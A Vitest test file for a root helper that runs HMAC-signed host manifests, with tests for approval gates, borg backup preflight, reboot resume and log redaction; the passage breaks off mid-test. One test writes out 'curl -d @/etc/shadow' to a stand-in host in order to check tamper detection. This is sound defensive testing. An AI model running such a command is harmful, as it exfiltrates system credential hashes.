import { spawnSync } from "node:child_process";
import { createHash, createHmac } from "node:crypto";
import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { hostRunManifestHash, parseHostRunManifest } from "../src/host-run.js";

// Harness for the root helper of the general door (deploy/helpers/cockpit-host-run).
// The helper runs for real (same Node, real bash for the steps); systemd-run,
// systemctl, the borg status and the hoster snapshot are stubs in a temp dir,
// wired in through the HOST_RUN_* harness hooks. The systemd-run stub runs the
// payload synchronously, so `start` returns when the run is over.

const HELPER = fileURLToPath(new URL("../../../deploy/helpers/cockpit-host-run", import.meta.url));
const GUARD = fileURLToPath(new URL("../../../deploy/helpers/cockpit-backup-guard.mjs", import.meta.url));
// Der Riegel importiert die Grenzen des Aufräum-Diensts; installiert liegen beide nebeneinander.
const RETENTION_RULES = fileURLToPath(new URL("../../../deploy/helpers/cockpit-borg-retention-rules.mjs", import.meta.url));
const NET = fileURLToPath(new URL("../../../deploy/helpers/cockpit-host-run-net.mjs", import.meta.url));
// Die Notfall-Anleitung der Systemsicherung; installiert liegt sie neben dem Helfer.
const NOTFALL = fileURLToPath(new URL("../../../deploy/lab0/cockpit-systemsicherung-NOTFALL.txt", import.meta.url));
const SECRET = "test-envelope-secret-0123456789";
const HOSTER_SECRET = "hoster-client-secret-abcdef";

let dir: string;
let helper: string;

function write(file: string, content: string, mode = 0o755) {
  writeFileSync(file, content);
  chmodSync(file, mode);
}

function hookEnv(extra: Record<string, string> = {}): NodeJS.ProcessEnv {
  return {
    PATH: process.env.PATH,
    HOST_RUN_STATE_DIR: path.join(dir, "runs"),
    HOST_RUN_CONFIG_DIR: path.join(dir, "etc"),
    HOST_RUN_SYSTEMD_RUN: path.join(dir, "systemd-run"),
    HOST_RUN_SYSTEMCTL: path.join(dir, "systemctl"),
    HOST_RUN_BORG_STATUS: path.join(dir, "borg-status"),
    HOST_RUN_SNAPSHOT: path.join(dir, "snapshot"),
    HOST_RUN_BOOT_ID_FILE: path.join(dir, "boot_id"),
    HOST_RUN_BORG: path.join(dir, "borg-standalone"),
    HOST_RUN_LSBLK: path.join(dir, "lsblk"),
    HOST_RUN_MDSTAT: path.join(dir, "mdstat"),
    HOST_RUN_MOUNTINFO: path.join(dir, "mountinfo"),
    HOST_RUN_RETENTION_STATUS: path.join(dir, "retention-status"),
    STUB_DIR: dir,
    ...extra,
  };
}

function run(args: string[], input = "", extra: Record<string, string> = {}) {
  const out = spawnSync(process.execPath, [helper, ...args], { input, encoding: "utf8", env: hookEnv(extra), timeout: 60_000 });
  return { code: out.status, stdout: out.stdout, stderr: out.stderr };
}

interface Manifest {
  version: string; name: string; purpose: string; mutates: boolean;
  steps: Array<{ name: string; run?: string; reboot?: boolean; timeoutSeconds?: number }>;
  checks: Array<{ name: string; run: string; timeoutSeconds: number }>;
  rollback: string[]; risk: string[];
}

function manifest(partial: Partial<Manifest> = {}): Manifest {
  return {
    version: "cockpit-host-run/v1", name: "test run", purpose: "harness", mutates: true,
    steps: [{ name: "one", run: `echo one > ${dir}/step-one`, timeoutSeconds: 30 }, { name: "two", run: `echo two > ${dir}/step-two`, timeoutSeconds: 30 }],
    checks: [{ name: "one ran", run: `test -f ${dir}/step-one`, timeoutSeconds: 30 }],
    rollback: ["remove the marker files"], risk: ["contained"],
    ...partial,
  };
}

function request(m: Manifest, envelopePatch: Record<string, unknown> = {}, jobId = "job-1", secret = SECRET) {
  const unsigned = {
    version: "hermes-execution-envelope/v1", jobId, actorId: "hermes-automation", sessionId: "s1",
    capabilities: ["host.run"], manifestHash: createHash("sha256").update(JSON.stringify(m)).digest("hex"),
    gatePassed: true, issuedAt: new Date().toISOString(), expiresAt: new Date(Date.now() + 10 * 60_000).toISOString(),
    ...envelopePatch,
  };
  const digest = createHmac("sha256", secret).update(JSON.stringify(unsigned)).digest("hex");
  return JSON.stringify({ manifest: m, envelope: { ...unsigned, digest } });
}

function status(jobId = "job-1") {
  const out = run(["status", jobId]);
  expect(out.code).toBe(0);
  return JSON.parse(out.stdout) as { ok: boolean; state: Record<string, any>; logTail: string };
}

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "host-run-"));
  helper = path.join(dir, "cockpit-host-run.mjs");
  copyFileSync(HELPER, helper);
  copyFileSync(GUARD, path.join(dir, "cockpit-backup-guard.mjs"));
  copyFileSync(RETENTION_RULES, path.join(dir, "cockpit-borg-retention-rules.mjs"));
  copyFileSync(NET, path.join(dir, "cockpit-host-run-net.mjs"));
  copyFileSync(NOTFALL, path.join(dir, "cockpit-systemsicherung-NOTFALL.txt"));
  mkdirSync(path.join(dir, "etc"));
  write(path.join(dir, "etc", "api.env"), `COCKPIT_EXECUTION_ENVELOPE_SECRET=${SECRET}\n`, 0o600);
  write(path.join(dir, "etc", "contabo.env"), `CONTABO_CLIENT_SECRET=${HOSTER_SECRET}\n`, 0o600);
  write(path.join(dir, "boot_id"), "boot-a\n", 0o644);
  // systemd-run: record the unit, run the command after `--` in the foreground.
  write(path.join(dir, "systemd-run"), [
    "#!/bin/bash",
    "[ -n \"${STUB_SYSTEMD_RUN_FAIL:-}\" ] && { echo 'Failed to start transient service' >&2; exit 1; }",
    "for a in \"$@\"; do case \"$a\" in --unit=*) echo \"${a#--unit=}\" >> \"$STUB_DIR/units.log\";; esac; done",
    "while [ \"$1\" != -- ]; do shift; done; shift",
    "COCKPIT_HOST_RUN_IN_UNIT=1 \"$@\"",
  ].join("\n"));
  write(path.join(dir, "systemctl"), [
    "#!/bin/bash",
    "case \"$1\" in",
    "  is-active) echo \"${STUB_UNIT_STATE:-inactive}\";;",
    "  reboot) echo reboot >> \"$STUB_DIR/reboot.log\"; exit \"${STUB_REBOOT_RC:-0}\";;",
    "  is-system-running) echo running;;",
    "  is-enabled) [ -e \"$STUB_DIR/disabled-$2\" ] && { echo disabled; exit 1; }; echo enabled;;",
    "esac",
  ].join("\n"));
  write(path.join(dir, "borg-status"), [
    "#!/bin/bash",
    "echo borg >> \"$STUB_DIR/borg.log\"",
    "end=$(date -u -d \"-${STUB_BORG_AGE_HOURS:-2} hours\" +%Y-%m-%dT%H:%M:%SZ)",
    "echo '== DATEN (cockpit-borg-status/v1) =='",
    "echo \"last_run_end=$end\"",
    "echo \"last_run_result=${STUB_BORG_RESULT:-success}\"",
  ].join("\n"));
  // The helper starts the snapshot tool with a clean environment: the stub
  // takes its directory from its own text and its failure switch from a file.
  write(path.join(dir, "snapshot"), [
    "#!/bin/bash",
    `echo "$*" >> "${dir}/snapshot.log"`,
    `[ -e "${dir}/snapshot-fail" ] && { echo 'the hoster API refused' >&2; exit 70; }`,
    "echo '{\"snapshot\":{\"snapshotId\":\"snap-42\",\"name\":\"'\"$2\"'\"},\"rotated\":{\"snapshotId\":\"snap-old\"},\"seconds\":12}'",
  ].join("\n"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe("cockpit-host-run: lock", () => {
  it("runs a signed manifest: borg check, snapshot, steps, checks", () => {
    const out = run(["start"], request(manifest()));
    expect(out.code).toBe(0);
    expect(out.stdout).toContain('"status":"started"');
    const { state, logTail } = status();
    expect(state.status).toBe("success");
    expect(state.steps.map((step: { status: string }) => step.status)).toEqual(["success", "success"]);
    expect(state.checks[0].status).toBe("passed");
    expect(state.snapshot.snapshotId).toBe("snap-42");
    expect(state.borg.lastRunResult).toBe("success");
    expect(state.actorId).toBe("hermes-automation");
    expect(readFileSync(path.join(dir, "units.log"), "utf8").trim()).toBe("cockpit-host-run-job-1");
    expect(readFileSync(path.join(dir, "snapshot.log"), "utf8")).toContain("create cockpit-run-job-1 --wait 900");
    expect(logTail).toContain("ordered by hermes-automation");
  });

  it("runs a manifest exactly as the API normalizes and hashes it", () => {
    const normalized = parseHostRunManifest(["```host-run", JSON.stringify({
      version: "cockpit-host-run/v1", name: "from the API", purpose: "harness",
      steps: [{ name: "one", run: `touch ${dir}/api-step` }, { name: "reboot", reboot: true }],
      checks: [{ name: "ran", run: `test -f ${dir}/api-step` }], rollback: ["nothing to undo"],
    }), "```"].join("\n"));
    expect(normalized).not.toBeNull();
    const body = request(normalized as unknown as Manifest);
    expect(JSON.parse(body).envelope.manifestHash).toBe(hostRunManifestHash(normalized!));
    expect(run(["start"], body).code).toBe(0);
    expect(status().state.phase).toBe("rebooting");
    writeFileSync(path.join(dir, "boot_id"), "boot-b\n");
    run(["resume"]);
    expect(status().state.status).toBe("success");
  });

  it.each([
    ["a wrong signature", request(manifest(), {}, "job-1", "another-secret"), "signature mismatch"],
    ["an expired envelope", request(manifest(), { expiresAt: new Date(Date.now() - 1000).toISOString() }), "expired"],
    ["an envelope without host.run", request(manifest(), { capabilities: ["read.host"] }), "does not grant host.run"],
    ["the envelope of a blocked job", request(manifest(), { gatePassed: undefined }), "neither a passed doorkeeper review nor an operator approval"],
  ])("refuses %s before anything exists", (_label, body, message) => {
    const out = run(["start"], body);
    expect(out.code).toBe(77);
    expect(out.stderr).toContain(message);
    expect(existsSync(path.join(dir, "runs", "job-1"))).toBe(false);
    expect(existsSync(path.join(dir, "units.log"))).toBe(false);
  });

  it("opens for the operator's approval of a job the doorkeeper stopped", () => {
    expect(run(["start"], request(manifest(), { gatePassed: undefined, operatorApproved: true })).code).toBe(0);
    expect(status().state.status).toBe("success");
  });

  // The steps really run here: they only write marker files whose names the
  // backup bolt recognizes, never a real borg or systemctl command.
  it("keeps a run that touches the backups shut without the operator's approval, even with a passed doorkeeper", () => {
    const prune = manifest({ steps: [{ name: "prune", run: `echo prune > ${dir}/borgmatic-prune.txt`, timeoutSeconds: 30 }] });
    const out = run(["start"], request(prune));
    expect(out.code).toBe(77);
    expect(out.stderr).toContain("touches the backups");
    expect(existsSync(path.join(dir, "runs", "job-1"))).toBe(false);
    expect(existsSync(path.join(dir, "units.log"))).toBe(false);
  });

  it("opens a run that touches the backups for the operator's approval", () => {
    const prune = manifest({ steps: [{ name: "status", run: `echo keep_daily: 1 > ${dir}/borgmatic-retention.txt`, timeoutSeconds: 30 }],
      checks: [{ name: "written", run: `test -f ${dir}/borgmatic-retention.txt`, timeoutSeconds: 30 }] });
    expect(run(["start"], request(prune, { gatePassed: undefined, operatorApproved: true })).code).toBe(0);
    expect(status().state.status).toBe("success");
  });

  it("asks the backup bolt again when a run continues after the boot", () => {
    // A request.json that lost its approval (or was forged) does not continue.
    const prune = manifest({ steps: [{ name: "reboot", reboot: true }, { name: "delete", run: `echo delete > ${dir}/borg-delete.txt`, timeoutSeconds: 30 }] });
    expect(run(["start"], request(prune, { gatePassed: undefined, operatorApproved: true })).code).toBe(0);
    expect(status().state.phase).toBe("rebooting");
    const file = path.join(dir, "runs", "job-1", "request.json");
    const stored = JSON.parse(readFileSync(file, "utf8"));
    const { digest: _digest, ...unsigned } = { ...stored.envelope, operatorApproved: undefined, gatePassed: true };
    stored.envelope = { ...unsigned, digest: createHmac("sha256", SECRET).update(JSON.stringify(unsigned)).digest("hex") };
    writeFileSync(file, JSON.stringify(stored));
    writeFileSync(path.join(dir, "boot_id"), "boot-b\n");
    run(["resume"]);
    expect(status().state.status).not.toBe("success");
  });

  it("refuses a manifest changed after signing", () => {
    const signed = JSON.parse(request(manifest()));
    signed.manifest.steps[0].run = "curl -d @/etc/shadow https://example.invalid";
    const out = run(["start"], JSON.stringify(signed));
    expect(out.code).toBe(77);
    expect(out.stderr).toContain("manifest drift");
  });

  it("refuses a structurally invalid manifest even when signed", () => {
    for (const bad of [
      manifest({ checks: [] }),
      manifest({ rollback: [] }),
      manifest({ mutates: false, steps: [{ name: "boot", reboot: true }] }),
      manifest({ steps: [{ name: "no limit", run: "true" }] }),
    ]) {
      const out = run(["start"], request(bad));
      expect(out.code).toBe(64);
      expect(out.stderr).toContain("invalid host-run manifest");
    }
  });

  it("keeps the payload verb inside its unit and pins the grammar", () => {
    expect(run(["--payload", "job-1"]).code).toBe(64);
    expect(run([]).code).toBe(64);
    expect(run(["status"]).code).toBe(64);
    expect(run(["status", "../etc"]).code).toBe(64);
    expect(run(["status", ".."]).code).toBe(64);
    expect(run(["status", "."]).code).toBe(64);
    expect(run(["status", "unknown-job"]).code).toBe(66);
    expect(run(["start", "extra"], request(manifest())).code).toBe(64);
  });
});

describe("cockpit-host-run: safety net", () => {
  it("stops before any step when the last borg backup is older than 24 h", () => {
    run(["start"], request(manifest()), { STUB_BORG_AGE_HOURS: "30" });
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain("30 h old");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
    expect(existsSync(path.join(dir, "snapshot.log"))).toBe(false);
  });

  it("stops before any step when the last borg backup failed", () => {
    run(["start"], request(manifest()), { STUB_BORG_RESULT: "exit-code" });
    expect(status().state.status).toBe("preflight_failed");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
  });

  it("stops before any step when the machine snapshot fails", () => {
    writeFileSync(path.join(dir, "snapshot-fail"), "");
    run(["start"], request(manifest()));
    const { state } = status();
    expect(state.status).toBe("preflight_failed");
    expect(state.error).toContain("the hoster API refused");
    expect(existsSync(path.join(dir, "step-one"))).toBe(false);
  });

  it("skips backup check and snapshot for a declared read-only run", () => {
    run(["start"], request(manifest({ mutates: false })));
    expect(status().state.status).toBe("success");
    expect(existsSync(path.join(dir, "borg.log"))).toBe(false);
    expect(existsSync(path.join(dir, "snapshot.log"))).toBe(false);
  });
});

describe("cockpit-host-run: door", () => {
  it("stops at the first failing step and names the return path", () => {
    run(["start"], request(manifest({ steps: [
      { name: "fails", run: "echo about to fail; exit 3", timeoutSeconds: 30 },
      { name: "never", run: `touch ${dir}/never`, timeoutSeconds: 30 },
    ] })));
    const { state, logTail } = status();
    expect(state.status).toBe("failed");
    expect(state.steps[0]).toMatchObject({ status: "failed", exitCode: 3 });
    expect(state.steps[1].status).toBe("pending");
    expect(existsSync(path.join(dir, "never"))).toBe(false);
    expect(logTail).toContain("about to fail");
    expect(logTail).toContain("machine snapshot snap-42");
  });

  it("kills a step at its time limit", () => {
    run(["start"], request(manifest({ steps: [{ name: "slow", run: "sleep 20", timeoutSeconds: 1 }] })));
    const { state } = status();
    expect(state.status).toBe("failed");
    expect(state.steps[0].timedOut).toBe(true);
    expect(state.error).toContain("time limit");
  });

  it("fails a step that exits 0 but held its output open past the limit", () => {
    run(["start"], request(manifest({ steps: [{ name: "daemon", run: "sleep 20 &", timeoutSeconds: 1 }, { name: "never", run: `touch ${dir}/never`, timeoutSeconds: 30 }] })));
    const { state } = status();
    expect(state.status).toBe("failed");
    expect(state.steps[0]).toMatchObject({ status: "failed", timedOut: true });
    expect(existsSync(path.join(dir, "never"))).toBe(false);
  });

  it("reports failing checks as check_failed", () => {
    run(["start"], request(manifest({ checks: [{ name: "impossible", run: "test -f /nonexistent/marker", timeoutSeconds: 30 }] })));
    const { state } = status();
    expect(state.status).toBe("check_failed");
    expect(state.checks[0].status).toBe("failed");
  });

  it("ends a private-key redaction without END line instead of blanking the rest of the log", () => {
    run(["start"], request(manifest({ steps: [
      { name: "dump", timeoutSeconds: 30, run: "echo '-----BEGIN RSA PRIVATE KEY-----'; echo MIIEsecret" },
      { name: "later", timeoutSeconds: 30, run: "for i in $(seq 1 250); do echo line-$i; done" },
    ] })));
    const log = readFileSync(path.join(dir, "runs", "job-1", "output.log"), "utf8");
    expect(log).not.toContain("MIIEsecret");
    expect(log).toContain("line-250");
    expect(log).toContain("run finished:");
  });

  it("redacts secrets in the log, including the Cockpit's own secret values", () => {
    run(["start"], request(manifest({ steps: [{
      name: "leaky", timeoutSeconds: 30,
      run: `echo "token=${"x".repeat(12)}"; echo "${HOSTER_SECRET}"; echo "${SECRET}" >&2; printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\\nabc\\n-----END OPENSSH PRIVATE KEY-----\\n'; echo visible-line`,
    }] })));
    const log = readFileSync(path.join(dir, "runs", "job-1", "output.log"), "utf8");
    expect(log).toContain("visible-line");
    expect(log).not.toContain(HOSTER_SECRET);
    expect(log).not.toContain(SECRET);
    expect(log).not.toContain("x".repeat(12));
    expect(log).not.toContain("abc\n");
    expect(log).toContain("[REDACTED:COCKPIT_SECRET]");
    expect(log).toContain("[REDACTED:PRIVATE_KEY]");
  });

  it("treats a reboot as a step and continues after the host is back", () => {
    run(["start"], request(manifest({ steps: [
      { name: "before", run: `touch ${dir}/before`, timeoutSeconds: 30 },
      { name: "reboot", reboot: true },
      { name: "after", run: `touch ${dir}/after`, timeoutSeconds: 30 },
    ], checks: [{ name: "after ran", run: `test -f ${dir}/after`, timeoutSeconds: 30 }] })));
    let { state } = status();
    expect(state.phase).toBe("rebooting");
    expect(state.status).toBe("running");
    expect(readFileSync(path.join(dir, "reboot.log"), "utf8").trim()).toBe("reboot");
    expect(existsSync(path.join(dir, "after"))).toBe(false);

    // Same boot: resume does nothing.
    expect(run(["resume"]).code).toBe(0);
    expect(existsSync(path.join(dir, "after"))).toBe(false);

    writeFileSync(path.join(dir, "boot_id"), "boot-b\n");
    expect(run(["resume"]).code).toBe(0);
    ({ state } = status());
    expect(state.status).toBe("success");
    expect(state.boots).toEqual(["boot-a", "boot-b"]);
    expect(existsSync(path.join(dir, "after"))).toBe(true);
    // One snapshot for the whole run, not one per boot.
    expect(readFileSync(path.join(dir, "snapshot.log"), "utf8").trim().split("\n")).toHaveLength(1);
    expect(status().logTail).toContain("host back up");
  });

  it("does not fail a run that is just being resumed after the boot", () => {
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }, { name: "after", run: "true", timeoutSeconds: 30 }] })));
    // The moment between resume saving "resuming" and its unit starting: the
    // API, started with the host, asks right then.
    const file = path.join(dir, "runs", "job-1", "state.json");
    const saved = JSON.parse(readFileSync(file, "utf8"));
    writeFileSync(file, JSON.stringify({ ...saved, phase: "resuming", boots: ["boot-a", "boot-b"], updatedAt: new Date().toISOString() }));
    expect(status().state).toMatchObject({ phase: "resuming", status: "running" });
    // Long after, with no unit: the continuation died, the run has failed.
    writeFileSync(file, JSON.stringify({ ...saved, phase: "resuming", boots: ["boot-a", "boot-b"], updatedAt: new Date(Date.now() - 10 * 60_000).toISOString() }));
    expect(status().state).toMatchObject({ phase: "finished", status: "failed" });
  });

  it("fails the run when the reboot request is refused", () => {
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }] })), { STUB_REBOOT_RC: "1" });
    expect(status().state.status).toBe("failed");
  });

  it("allows one run at a time", () => {
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }] })));
    expect(status().state.phase).toBe("rebooting");
    const second = run(["start"], request(manifest(), {}, "job-2"));
    expect(second.code).toBe(75);
    expect(second.stderr).toContain("another host run is active: job-1");
    expect(run(["start"], request(manifest())).code).toBe(75);
  });

  it("keeps control characters out of the log", () => {
    run(["start"], request(manifest({ steps: [{ name: "colour", run: "printf '\\033[1;32mgreen\\033[0m\\a done\\n'", timeoutSeconds: 30 }] })));
    const log = readFileSync(path.join(dir, "runs", "job-1", "output.log"), "utf8");
    expect(log).toContain("green done");
    expect(log).not.toMatch(/[\x00-\x08\x0b-\x1f]/);
  });

  it("lets only one start pass the lock and clears a lock left by a crash", () => {
    mkdirSync(path.join(dir, "runs", ".start.lock"), { recursive: true });
    const blocked = run(["start"], request(manifest()));
    expect(blocked.code).toBe(75);
    expect(blocked.stderr).toContain("another host run is starting");
    const old = new Date(Date.now() - 10 * 60_000);
    utimesSync(path.join(dir, "runs", ".start.lock"), old, old);
    expect(run(["start"], request(manifest())).code).toBe(0);
    expect(existsSync(path.join(dir, "runs", ".start.lock"))).toBe(false);
  });

  it("fails a run whose requested reboot never happened and opens the door again", () => {
    run(["start"], request(manifest({ steps: [{ name: "reboot", reboot: true }] })));
    const statePath = path.join(dir, "runs", "job-1", "state.json");
    const state = JSON.parse(readFileSync(statePath, "utf8"));
    writeFileSync(statePath, JSON.stringify({ ...state, rebootRequestedAt: new Date(Date.now() - 31 * 60_000).toISOString() }));
    expect(status().state).toMatchObject({ phase: "finished", status: "failed", error: "the requested reboot did not happen" });
    expect(run(["start"], request(manifest(), {}, "job-2")).code).toBe(0);
  });

  it("reports a run whose unit vanished without a result as failed", () => {
    const out = run(["start"], request(manifest()), { STUB_SYSTEMD_RUN_FAIL: "1" });
    expect(out.code).toBe(70);
    expect(status().state.status).toBe("failed");
  });
});

// The net of a physical box (Lab0, Jochen's decision of 02.10.2026): RAID,
// mounted backup disk, space, the retention service, then a borg archive in
// the door's own repository on the RAID, the standalone binary and NOTFALL.txt
// next to it, and retention per series only by the door's own archive names.
// borg, lsblk, the retention status, /proc/mdstat and mountinfo are stubs; the
// helper starts them with a clean environment, so those stubs take their
// directory from their own text and their switches from files. The borg stub
// keeps the archive names of a repository in <repo>/archives and prunes them
// by --glob-archives/--keep-last like borg.
describe("cockpit-host-run: net of a physical box (system-backup)", () => {
  let raid: string;
  let target: string;
  let repo: string;

  function lab0Net(patch: Record<string, unknown> = {}, backupPatch: Record<string, unknown> = {}) {
    return {
      version: "cockpit-host-run-net/v1", net: "system-backup",
      systemBackup: { target, mount: raid, raidDevice: "md0", sources: ["/proc"], exclude: ["/swap.img", "/home/jochen/Nextcloud"], keepPreRun: 2, keepWeekly: 3, reserveGB: 0, timeoutSeconds: 600, ...backupPatch },
      retentionService: true,
      reboot: { onSite: true, mustBeEnabled: [["wg-quick@wg0.service"], ["ssh.service", "ssh.socket"]] },
      ...patch,
    };
  }
  function writeNet(value: unknown, mode = 0o644) {
    write(path.join(dir, "etc", "host-run-net.json"), JSON.stringify(value), mode);
  }
  function borgCalls(verb?: string) {
    const file = path.join(dir, "borg-calls.log");
    const calls = existsSync(file) ? readFileSync(file, "utf8").trim().split("\n") : [];
    return verb ? calls.filter((line) => line.startsWith(`${verb} `)) : calls;
  }
  function archives() {
    const file = path.join(repo, "archives");
    return existsSync(file) ? readFileSync(file, "utf8").trim().split("\n").filter(Boolean) : [];
  }
  function seedRepo(names: string[]) {
    mkdirSync(repo, { recursive: true });
    writeFileSync(path.join(target, ".cockpit-systemsicherung"), "");
    writeFileSync(path.join(repo, "config"), "[repository]\n");
    writeFileSync(path.join(repo, "archives"), names.map((name) => `${name}\n`).join(""));
  }
  function weekly(extra: Record<string, string> = { COCKPIT_SYSTEM_BACKUP_IN_UNIT: "1" }) {
    return run(["weekly-backup"], "", extra);
  }

  beforeEach(() => {
    raid = path.join(dir, "raid");
    target = path.join(raid, "lab0-systemsicherung");
    repo = path.join(target, "repo");
    mkdirSync(raid);
    write(path.join(dir, "mdstat"), [
      "Personalities : [raid6] [raid5] [raid4]",
      "md0 : active raid5 sdd1[4] sdc1[2] sdb1[1] sda1[0]",
      "      2929890816 blocks super 1.2 level 5, 512k chunk, algorithm 2 [4/4] [UUUU]",
      "",
      "unused devices: <none>",
    ].join("\n"), 0o644);
    write(path.join(dir, "mountinfo"), [
      "26 1 253:0 / / rw,relatime shared:1 - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw",
      "30 26 8:1 / /boot rw,relatime shared:2 - ext4 /dev/sde2 rw",
      `40 26 9:0 / ${raid} rw,relatime shared:3 - ext4 /dev/md0 rw`,
    ].join("\n"), 0o644);
    write(path.join(dir, "borg-standalone"), [
      // Like the real binary: borg prints its own file name, then the version.
      "#!/bin/bash",
      `D="${dir}"`,
      "[ \"$1\" = --version ] && { cat \"$D/borg-version\" 2>/dev/null || echo \"${0##*/} 1.4.5\"; exit 0; }",
      "printf '%s\\n' \"$*\" >> \"$D/borg-calls.log\"",
      "[ \"$BORG_UNKNOWN_UNENCRYPTED_REPO_ACCESS_IS_OK\" = yes ] || { echo 'unencrypted repo access refused' >&2; exit 2; }",
      "cmd=$1; shift",
      "for last; do :; done",
      "[ -e \"$D/borg-$cmd-rc\" ] && exit \"$(cat \"$D/borg-$cmd-rc\")\"",
      "case \"$cmd\" in",
      "  init) mkdir -p \"$last\" && echo '[repository]' > \"$last/config\";;",
      "  create) for a; do case \"$a\" in *::*) r=${a%%::*}; n=${a#*::};; esac; done",
      "    echo \"$n\" >> \"$r/archives\"; echo \"Archive name: $n\";;",
      "  prune) glob=; keep=; while [ $# -gt 0 ]; do case \"$1\" in --glob-archives) glob=$2; shift;; --keep-last=*) keep=${1#--keep-last=};; esac; shift; done",
      "    [ -n \"$glob\" ] && [ -n \"$keep\" ] || { echo 'prune without glob or keep' >&2; exit 2; }",
      "    prefix=${glob%\\*}; mine=$(grep -c \"^$prefix\" \"$last/archives\"); drop=$((mine - keep)); i=0",
      "    : > \"$last/archives.new\"",
      "    while read -r a; do if [[ $a == \"$prefix\"* ]]; then i=$((i + 1)); [ $i -le $drop ] && { echo \"Pruning archive: $a\"; continue; }; fi; echo \"$a\" >> \"$last/archives.new\"; done < \"$last/archives\"",
      "    mv \"$last/archives.new\" \"$last/archives\";;",
      "esac",
    ].join("\n"));
    write(path.join(dir, "lsblk"), "#!/bin/bash\necho 'NAME TYPE FSTYPE UUID'\necho 'ubuntu--vg-ubuntu--lv lvm ext4 1111-root'\n");
    write(path.join(dir, "retention-status"), [
      "#!/bin/bash",
      "echo '== DATEN (cockpit-borg-retention/v1) =='",
      `if [ -e "${dir}/retention-halted" ]; then echo '{"state":{"status":"angehalten","anomaly":{"id":"0123456789abcdef"}}}'; else echo '{"state":{"status":"ok","anomaly":null}}'; fi`,
    ].join("\n"));
    writeNet(lab0Net());
  });

  it("checks RAID, disk, space and the retention service, then makes a borg archive instead of borg status and the hoster snapshot", () => {
    expect(run(["start"], request(manifest())).code).toBe(0);
    const { state, logTail } = status();
    expect(state.status).toBe("success");
    expect(state.snapshot).toBeNull();
    expect(state.borg).toBeNull();
    expect(existsSync(path.join(dir, "borg.log"))).toBe(false);
    expect(existsSync(path.join(dir, "snapshot.log"))).toBe(false);
    const [archive] = archives();
    expect(archive).toMatch(/^vorlauf-\d{8}T\d{6}Z-job-1$/);
    expect(state.systemBackup).toMatchObject({ path: `${repo}::${archive}`, repo, archive, series: "preRun", keep: 2, repoCreated: true, borgExit: 0, upkeepError: null });
    expect(state.net).toMatchObject({ net: "system-backup", onSite: true });
    // Unencrypted repository, one file system, the configured excludes, own series only.
    expect(borgCalls()).toEqual([
      `init --encryption=none ${repo}`,
      `create --lock-wait 600 --one-file-system --numeric-ids --exclude-caches --compression zstd,3 --stats --show-rc --exclude /swap.img --exclude /home/jochen/Nextcloud ${repo}::${archive} /proc`,
      `prune --lock-wait 600 --list --glob-archives vorlauf-* --keep-last=2 ${repo}`,
      `compact --lock-wait 600 ${repo}`,
    ]);
    expect(logTail).toContain("RAID md0 [4/4] [UUUU]");
    expect(logTail).toContain("borg-standalone 1.4.5");
    expect(logTail).toContain(`Archive name: ${archive}`);
  });

  it("keeps root's directory private and puts the standalone binary, NOTFALL.txt and the disk layout next to the repository", () => {
    mkdirSync(target, { mode: 0o755 });
    run(["start"], request(manifest()));
    expect(status().state.status).toBe("success");
    expect(statSync(target).mode & 0o777).toBe(0o700);
    expect(readdirSync(target).sort()).toEqual([".cockpit-systemsicherung", "NOTFALL.txt", "PLATTEN.txt", "borg", "repo"]);
    expect(readFileSync(path.join(target, "borg"), "utf8")).toBe(readFileSync(path.join(dir, "borg-standalone"), "utf8"));
    expect(statSync(path.join(target, "borg")).mode & 0o777).toBe(0o700);
    const guide = readFileSync(path.join(target, "NOTFALL.txt"), "utf8");
    expect(guide).not.toContain("{{");
    expect(guide).toContain(`${target}/borg extract --numeric-ids --list`);
    expect(guide).toContain(`${repo}::<ARCHIVNAME>`);
    expect(guide).toContain("mdadm --assemble --scan");
    expect(guide).toContain("grub-install");
    expect(guide).toContain("cat /mnt/root/etc/fstab");
    expect(statSync(path.join(target, "NOTFALL.txt")).mode & 0o777).toBe(0o600);
    const layout = readFileSync(path.join(target, "PLATTEN.txt"), "utf8");
    expect(layout).toContain("1111-root");
    expect(layout).toContain("md0 : active raid5");
  });

  it("prunes only its own pre-run series in its own repository and never a foreign archive", () => {
    mkdirSync(target);
    seedRepo([
      "vmd61162-2026-09-30T00:37:00", "vorlauf-20260901T010000Z-a", "woche-20260906T033000Z", "vorlauf-20260902T010000Z-b",
      "woche-20260913T033000Z", "vorlauf-20260903T010000Z-c", "handgemacht",
    ]);
    run(["start"], request(manifest()));
    const { state } = status();
    expect(state.status).toBe("success");
    expect(state.systemBackup.repoCreated).toBe(false);
    expect(borgCalls("init")).toEqual([]);
    // keepPreRun 2: the last old one and the new one; the weekly series and foreign archives stay.
    expect(archives()).toEqual([
      "vmd61162-2026-09-30T00:37:00", "woche-20260906T033000Z", "woche-20260913T033000Z", "vorlauf-20260903T010000Z-c", "handgemacht",
      expect.stringMatching(/^vorlauf-\d{8}T\d{6}Z-job-1$/),
    ]);
    expect(status().logTail).toContain("Pruning archive: vorlauf-20260901T010000Z-a");
  });

  it("makes the weekly backup with the same checks, its own series and its own retention", () => {
    mkdirSync(target);
    seedRepo(["woche-20260906T033000Z", "vorlauf-20260901T010000Z-a", "woche-20260913T033000Z", "woche-20260920T033000Z", "vorlauf-20260902T010000Z-b", "vorlauf-20260903T010000Z-c"]);
    const out = weekly();
    expect(out.stderr).toBe("");
    expect(out.code).toBe(0);
    expect(out.stdout).toContain("RAID md0 [4/4] [UUUU]");
    expect(borgCalls("prune")).toEqual([`prune --lock-wait 600 --list --glob-archives woche-* --keep-last=3 ${repo}`]);
    // keepWeekly 3: two old weekly archives and the new one; pre-run archives untouched.
    expect(archives()).toEqual([
